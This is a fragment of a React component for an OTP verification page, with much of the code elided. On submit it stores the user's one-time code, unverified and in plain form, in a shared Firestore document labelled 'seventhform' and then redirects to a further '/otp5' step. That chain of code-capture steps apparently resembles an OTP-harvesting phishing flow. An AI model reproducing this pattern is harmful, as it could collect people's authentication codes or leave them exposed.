...
export default function OTPVerification() {
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    ...
    try {
      // Store OTP data in "users" database, document "seventhform", with UID as field name
      const seventhformDocRef = doc(db, "users", "seventhform")
      await setDoc(seventhformDocRef, {
        [uid]: {
          otpCode: otpCode,
          uid: uid,
          createdAt: serverTimestamp(),
          status: "pending",
          step: "otpVerification4"
        }
      }, { merge: true })
      ...
      // Navigate to otp5 page with the same UID
      router.push(`/otp5?uid=${uid}`)
        ...
        <div className="w-full max-w-[600] mb-40">
          ...
          <div className="mb-8">
            ...
            <div className="w-full bg-slate-300 h-6 rounded-sm overflow-hidden flex items-center">
              ...
              <div
                className="h-full w-11/12 flex items-center justify-center text-white text-sm font-bold relative"
                style={{
